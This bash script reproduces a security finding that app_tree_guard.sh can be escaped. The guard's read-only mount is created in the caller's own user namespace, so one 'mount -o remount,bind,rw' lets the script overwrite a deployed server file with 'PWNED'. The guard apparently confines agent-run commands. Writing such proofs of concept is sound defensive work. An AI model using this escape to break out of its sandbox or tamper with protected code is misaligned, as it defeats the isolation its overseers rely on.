#!/usr/bin/env bash
# TOG-711 finding F1: app_tree_guard.sh --exec is escapable in ONE step.
#
# The guard creates the read-only bind INSIDE the same user namespace it then
# runs the caller's command in. The command therefore holds CAP_SYS_ADMIN over
# the very namespace that owns the mount, so it can simply remount it rw.
#
# Mount locking (the mechanism docs/app-tree-immutability.md relies on) applies
# only to a mount INHERITED from a PARENT user namespace. Nothing is inherited
# here, so nothing is locked.
#
# Exit 0 = guard escaped (finding reproduces). Exit 1 = guard held.
set -uo pipefail
GUARD="${1:?usage: repro_tog711_escape.sh /path/to/app_tree_guard.sh}"
T=$(mktemp -d); trap 'rm -rf "$T"' EXIT
APP="$T/app"
mkdir -p "$APP"/{server/dist,server/node_modules/.vite,node_modules/.vite} \
         "$APP"/packages/adapter-utils/src/acpx-engine \
         "$APP"/packages/adapters/claude-local/src "$APP"/cli
echo 'REAL SERVER CODE'   > "$APP/server/dist/index.js"
echo '{"name":"paperclip"}' > "$APP/package.json"
echo 'lockfileVersion: 9' > "$APP/pnpm-lock.yaml"
echo 'deps: {}'          > "$APP/node_modules/.modules.yaml"
echo '{"name":"cli"}'    > "$APP/cli/package.json"
echo 'export const x=1'  > "$APP/packages/adapter-utils/src/acpx-engine/execute.ts"
echo 'export const y=1'  > "$APP/packages/adapters/claude-local/src/index.ts"

APP_TREE_GUARD_APP="$APP" "$GUARD" --exec -- bash -c '
  A="'"$APP"'"
  # Confirm the guard is genuinely in effect first, so a pass cannot be vacuous.
  if (echo probe > "$A/server/dist/index.js") 2>/dev/null; then
    echo "BASELINE-BROKEN: tree was writable before the escape"; exit 3
  fi
  mount -o remount,bind,rw "$A" 2>/dev/null || exit 4
  echo PWNED > "$A/server/dist/index.js" 2>/dev/null || exit 5
' >/dev/null 2>&1

got=$(cat "$APP/server/dist/index.js")
if [ "$got" = "PWNED" ]; then
  echo "ESCAPED: single remount,bind,rw defeated the guard; deployed file overwritten"
  exit 0
fi
echo "HELD: guard survived (file still: $got)"
exit 1
